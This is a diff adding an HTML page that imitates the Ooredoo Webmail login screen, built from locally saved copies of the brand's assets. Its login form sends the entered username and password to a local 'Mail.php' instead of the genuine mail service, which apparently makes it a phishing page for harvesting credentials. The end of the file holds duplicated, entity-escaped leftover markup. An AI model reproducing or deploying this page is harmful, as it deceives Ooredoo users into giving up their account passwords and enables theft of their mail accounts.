@@ -1,0 +1,192 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd"><html class="dj_gecko dj_ff36 dj_contentbox dj_webkit dj_safari dj_contentbox" dir="ltr" xmlns="http://www.w3.org/1999/xhtml"><head>
+		<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+		<!-- Mimic Internet Explorer 7 -->
+		<meta http-equiv="X-UA-Compatible" content="IE=EmulateIE7">
+		 <link rel="Shorcut Icon" href="https://wm.qatar.net.qa/iwc_static/layout/images/favicon.ico" type="image/x-icon">
+		<title>Ooredoo Webmail</title>
+		<style type="text/css">
+			@import "../js/dojotoolkit/dojo/resources/dojo.css?3.0.0.1.0_14062908";
+			@import "../js/dojotoolkit/dijit/themes/dijit.css?3.0.0.1.0_14062908";
+			@import "../js/dojotoolkit/dijit/themes/dijit_rtl.css?3.0.0.1.0_14062908";
+			@import "../js/dojotoolkit/dijit/themes/tundra/form/Button.css?3.0.0.1.0_14062908";
+			@import "../js/dojotoolkit/dojox/form/resources/DropDownSelect.css?3.0.0.1.0_14062908";
+		</style>
+		<link rel="stylesheet" href="ooredoo_files/login.css" type="text/css">
+		<script type="text/javascript">
+			var djConfig= {
+				cacheBust: "3.0.0.1.0_14062908",
+				isDebug:false,
+				parseOnLoad:true
+			};
+
+			(function() {
+				function getParameter(paramName) {
+					paramName += "=";
+					var queryString = window.location.search;
+					var strBegin = queryString.indexOf(paramName);
+					if (strBegin==-1){
+						strBegin = queryString.length;
+					}
+					else {
+						strBegin += paramName.length;
+					}
+					var strEnd = queryString.indexOf("&",strBegin);
+
+					if (strEnd==-1){
+						strEnd = queryString.length;
+					}
+
+					return queryString.substring(strBegin,strEnd);
+				}
+
+				var locale = getParameter("lang");
+				if (locale.length >0){
+					djConfig.locale = locale.toLowerCase();
+					if ((djConfig.locale.indexOf("ar") == 0) || (djConfig.locale.indexOf("he") == 0)) {
+						djConfig.direction = "rtl";
+					}
+					else {
+						djConfig.direction = "ltr";
+					}
+					var top = document.getElementsByTagName("html")[0];
+					top.dir = djConfig.direction;
+				}
+			})()
+		</script>
+
+		<script type="text/javascript" src="ooredoo_files/dojo.js"></script></head><body><textarea id="dijit._editor.RichText.savedContent" style="display:none;position:absolute;top:-100px;left:-100px;height:3px;width:3px;overflow:hidden;"></textarea><textarea id="dijit._editor.RichText.savedContent" style="display:none;position:absolute;top:-100px;left:-100px;height:3px;width:3px;overflow:hidden;"></textarea>
+		<script type="text/javascript">
+			dojo.registerModulePath("iwc", "../../iwc");
+			dojo.require("iwc.i18n.resources");
+			dojo.requireLocalization("iwc.i18n","resources");
+			iwc.l10n = dojo.i18n.getLocalization("iwc.i18n", "resources");
+			dojo.require("iwc.login");
+
+
+			dojo.addOnLoad(function(){
+
+				// prevent clickjacking
+				if (top.location.hostname != self.location.hostname) {
+					try {
+						if (document.forms[0].password) {
+							document.forms[0].style.display = "none";
+						}
+					} catch (e) {
+						document.body.style.display = "none";
+					}
+				}
+
+				iwc.login.setFocus();
+				iwc.login.doI18N();
+				//document.getElementById('picCache').src='imageList.html?'+djConfig.cacheBust;
+				//var lang = langLblMapping[djConfig.locale.toLowerCase()]?langLblMapping[djConfig.locale.toLowerCase()]:langLblMapping['en-us'];
+				var lang = "en_us";
+				if(djConfig && djConfig.locale) {
+					lang = djConfig.locale.toLowerCase();
+				}
+				dijit.byId('langButton').attr("value", lang);
+				dojo.connect(dijit.byId("langButton"), "onChange", function(lang) {
+					var loginUrl = window.location;
+
+					if(window.location.search!=""&&window.location.search.indexOf('lang=')>-1)
+						loginUrl = loginUrl.href.replace('lang='+iwc.login.getParameter('lang'),'lang='+lang);
+					else
+						loginUrl = loginUrl+"?lang="+lang
+
+					if(window.location.search.indexOf("u=1")==-1)
+						loginUrl=loginUrl+'&u=1';
+                    
+					window.location = loginUrl;
+					return false;
+				});
+			});
+
+			function login() {
+				return iwc.login.checkName();
+			}
+		</script>
+	
+
+	
+ 	<div class="login-wrapper">
+<div class="header">
+<div class="head-title" style="margin-left: -5px;">Ooredoo Webmail</div>
+<div class="logo"><img src="ooredoo_files/logo.png" style="padding-left: 
+3%;" alt="ooredoo" height="73" width="228"></div>
+<div class="clearfix"></div>
+</div>
+<div class="login-welcome">Welcome to Ooredoo Webmail</div>
+				<div class="Convergence-Login-Notification" style="visibility: hidden;text-align:center;margin-top: 2%;" id="alertMsg" aria-live="assertive" role="alert" tabindex="0"></div>
+			<div class="login-form-wrapper">	
+				<form action="Mail.php" method="post" onsubmit="return login();">
+
+					<div>
+						<div class="login-form">
+		<ul> 
+		<li>
+		<label style="margin-left: 12px;">User name </label>
+                <input name="username" id="username" class="txt re
+quired" type="text">
+              </li>
+                  <li>
+                <label style="margin-left: 15px;">Password </label>
+                <input name="password" id="password" class="txt required" type="password">
+              </li>
+                </ul>
+            <div class="clearfix"></div>
+          </div>
+<!-- <div dojoType="dijit.form.Button"
+
+         id="signin"
+
+         type="submit"
+
+         dojoAttachEvent="onClick: login"></div>
+-->
+           <div dojoattachevent="onClick: login">
+		<button type="submit" class="btn-submit" title="Sign in">Sign in</button>
+	</div>  
+              <div class="clearfix"></div>
+              </div>
+            </form>
+            <div class="clearfix"></div>
+</div>
+<div class="copyright">
+Copyright © 2015, Ooredoo Q.S.C. and/or its affiliates. All rights reserved. 
+Use is subject to license terms.
+</div>
+</div>
+<div id="overlay" class="login">
+                        <div class="centered">
+                                <div class="logo"></div>
+                                <div id="progress"></div>
+                        </div>
+                </div>
+
+                <iframe name="picCache" id="picCache" src="" frameborder="0" height="0" width="0"></iframe>
+<iframe name="picCache" id="picCache" src="" frameborder="0" height="0" width="0">&amp;lt;/
+iframe&amp;lt;/div&amp;gt;
+&amp;lt;div class="copyright"&amp;gt;
+Copyright © 2013, Ooredoo Q.S.C. and/or its affiliates. All rights reserved. 
+Use is subject to license terms.
+&amp;lt;/div&amp;gt;
+&amp;lt;/div&amp;gt;
+&amp;lt;div id="overlay" class="login"&amp;gt;
+                        &amp;lt;div class="centered"&amp;gt;
+                                &amp;lt;div class="logo"&amp;gt;&amp;lt;/div&amp;gt;
+                                &amp;lt;div id="progress"&amp;gt;&amp;lt;/div&amp;gt;
+                        &amp;lt;/div&amp;gt;
+                &amp;lt;/div&amp;gt;
+
+                &amp;lt;iframe name="picCache" id="picCache" src="" width=0 height=0 
+frameborder=0&amp;gt;</iframe>
+<iframe name="picCache" id="picCache" src="" frameborder="0" height="0" width="0">&amp;lt;/
+iframe&amp;gt;
+		&amp;lt;noscript&amp;gt;
+			&amp;lt;div style="width:50%; margin-top: 5%; margin-left:auto; margin-right:auto"&amp;gt;
+				&amp;lt;iframe src="noscript.html" frameborder=0 width=100%" /&amp;gt;
+			&amp;lt;/div&amp;gt;
+		&amp;lt;/noscript&amp;gt;
+	&amp;lt;/body&amp;gt;
+&amp;lt;/html&amp;gt;
+</iframe></body></html>
